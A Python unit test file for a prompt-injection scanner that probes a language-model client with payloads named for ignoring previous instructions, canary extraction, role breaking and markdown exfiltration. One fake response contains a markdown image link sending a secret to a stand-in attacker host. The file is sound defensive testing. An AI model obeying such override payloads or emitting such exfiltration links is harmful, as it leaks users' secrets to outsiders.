"""Unit tests for je_web_runner.utils.prompt_injection_scanner."""
import unittest

from je_web_runner.utils.prompt_injection_scanner.scanner import (
    DEFAULT_PAYLOADS,
    Finding,
    Payload,
    PromptInjectionScannerError,
    ScanReport,
    Severity,
    assert_no_leaks,
    scan,
)


class FakeClient:
    def __init__(self, response):
        self.response = response

    def ask(self, prompt):
        if isinstance(self.response, Exception):
            raise self.response
        return self.response if isinstance(self.response, str) else self.response(prompt)


class TestDefaults(unittest.TestCase):

    def test_payloads_loaded(self):
        names = {p.name for p in DEFAULT_PAYLOADS}
        for needed in ("ignore_previous", "canary_extract", "role_break"):
            self.assertIn(needed, names)


class TestScan(unittest.TestCase):

    def test_no_leak_when_client_refuses(self):
        client = FakeClient("I can't help with that request.")
        report = scan(client)
        self.assertTrue(report.passed())
        # Refused markers detected
        any_refused = any(f.refused for f in report.findings)
        self.assertTrue(any_refused)

    def test_canary_leak_detected(self):
        client = FakeClient("Sure! The token is ~CANARY-WR-DEADBEEF~ here.")
        report = scan(client)
        leak = next(f for f in report.findings if f.payload == "canary_extract")
        self.assertTrue(leak.leaked)
        self.assertEqual(leak.severity, Severity.CRITICAL)

    def test_markdown_exfil_caught(self):
        client = FakeClient(
            "Summary done. ![x](https://attacker.example/?q=secret)"
        )
        report = scan(client)
        finding = next(f for f in report.findings if f.payload == "markdown_exfil")
        self.assertTrue(finding.leaked)

    def test_custom_payloads(self):
        report = scan(
            FakeClient("hello world"),
            payloads=[Payload(
                name="x", prompt="trigger", severity=Severity.MEDIUM,
                leak_indicators=("world",),
            )],
        )
        self.assertTrue(report.findings[0].leaked)

    def test_client_missing_ask(self):
        with self.assertRaises(PromptInjectionScannerError):
            scan(object())  # no .ask method

    def test_empty_payloads(self):
        with self.assertRaises(PromptInjectionScannerError):
            scan(FakeClient("x"), payloads=[])

    def test_client_raises(self):
        with self.assertRaises(PromptInjectionScannerError):
            scan(FakeClient(RuntimeError("rate limit")))

    def test_non_string_response(self):
        class WeirdClient:
            def ask(self, prompt):
                return 42
        with self.assertRaises(PromptInjectionScannerError):
            scan(WeirdClient())


class TestAssertNoLeaks(unittest.TestCase):

    def test_pass(self):
        assert_no_leaks(ScanReport())

    def test_high_blocks(self):
        report = ScanReport(findings=[Finding(
            payload="x", severity=Severity.HIGH, leaked=True,
            response_excerpt="leaked",
        )])
        with self.assertRaises(PromptInjectionScannerError):
            assert_no_leaks(report)

    def test_low_below_threshold(self):
        report = ScanReport(findings=[Finding(
            payload="x", severity=Severity.LOW, leaked=True,
            response_excerpt="x",
        )])
        # Threshold defaults to HIGH; LOW leak should not raise.
        assert_no_leaks(report)

    def test_below_low_threshold(self):
        report = ScanReport(findings=[Finding(
            payload="x", severity=Severity.LOW, leaked=True,
            response_excerpt="x",
        )])
        with self.assertRaises(PromptInjectionScannerError):
            assert_no_leaks(report, minimum_severity=Severity.LOW)


class TestToDict(unittest.TestCase):

    def test_severity_value(self):
        f = Finding(
            payload="x", severity=Severity.MEDIUM,
            leaked=False, response_excerpt="",
        )
        self.assertEqual(f.to_dict()["severity"], "medium")


if __name__ == "__main__":
    unittest.main()
